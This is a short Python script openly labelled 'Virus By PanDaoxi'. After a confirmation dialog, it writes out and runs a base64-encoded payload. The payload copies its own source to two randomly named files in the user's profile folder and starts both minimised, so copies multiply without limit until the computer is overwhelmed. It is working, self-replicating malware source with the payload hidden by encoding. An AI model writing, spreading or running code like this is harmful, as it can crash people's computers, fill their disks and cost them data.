# Author: PanDaoxi
from easygui import buttonbox, msgbox
from base64 import b64decode
from os import system
from sys import exit

try:
    text = b"IyBBdXRob3I6IFBhbkRhb3hpCmZyb20gb3MgaW1wb3J0IHN5c3RlbSwgZW52aXJvbgpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludCwgc2h1ZmZsZQpmcm9tIHN5cyBpbXBvcnQgZXhpdAoKbmFtZXNfY2hhciwgcDEsIHAyID0gW10sICIiLCAiIgpmb3IgaSBpbiByYW5nZSg5NywgMTIzKToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKZm9yIGkgaW4gcmFuZ2UoNjUsIDkxKToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKZm9yIGkgaW4gcmFuZ2UoNDgsIDU4KToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKCmRlZiBtYWtlTmFtZXMoKToKICAgIG5hbWUsIHRlbXAgPSAiIiwgbmFtZXNfY2hhcgogICAgc2h1ZmZsZSh0ZW1wKQogICAgbmFtZSA9ICIiLmpvaW4odGVtcCkKICAgIAogICAgc3RhcnQgPSByYW5kaW50KDAsIGxlbihuYW1lKSAtIDEpCiAgICBlbmQgPSByYW5kaW50KHN0YXJ0LCBsZW4obmFtZSkgLSAxKSArIDEKICAgIAogICAgcmV0dXJuIG5hbWVbc3RhcnQgOiBlbmRdCgp0cnk6CiAgICB3aXRoIG9wZW4oX19maWxlX18sICJyYiIpIGFzIHNvdXJjZToKICAgICAgICBwYW5kYW94aSA9IHNvdXJjZS5yZWFkKCkKICAgICAgICB0UGF0aCA9IGVudmlyb25bIlVzZXJQcm9GaWxlIl0KICAgICAgICBwMSwgcDIgPSB0UGF0aCArICJcJXMucHkiICUgbWFrZU5hbWVzKCksIHRQYXRoICsgIlwlcy5weSIgJSBtYWtlTmFtZXMoKQogICAgICAgIAogICAgICAgIHdpdGggb3BlbihwMSwgIndiIikgYXMgdzE6CiAgICAgICAgICAgIHcxLndyaXRlKHBhbmRhb3hpKQogICAgICAgIHdpdGggb3BlbihwMiwgIndiIikgYXMgdzI6CiAgICAgICAgICAgIHcyLndyaXRlKHBhbmRhb3hpKQogICAgICAgICAgICAKICAgIHN5c3RlbSgic3RhcnQgL21pbiBweXRob24gXCIlc1wiIiAlIHAxKQogICAgc3lzdGVtKCJzdGFydCAvbWluIHB5dGhvbiBcIiVzXCIiICUgcDIpCiAgICAKICAgIGV4aXQoKQpleGNlcHQ6CiAgICBleGl0KCkgCg=="
    cho = buttonbox("Are you sure you want to run this program?\nThis may cause your computer to crash.", "Virus By PanDaoxi", ("Yes", "No",))
    
    if cho == "Yes":
        with open("virus.py", "wb") as f:
            f.write(b64decode(text))
        system("python \"virus.py\"")

except Exception as e:
    msgbox("Error at:\n\n%s" % e, "Virus Error")
    exit()
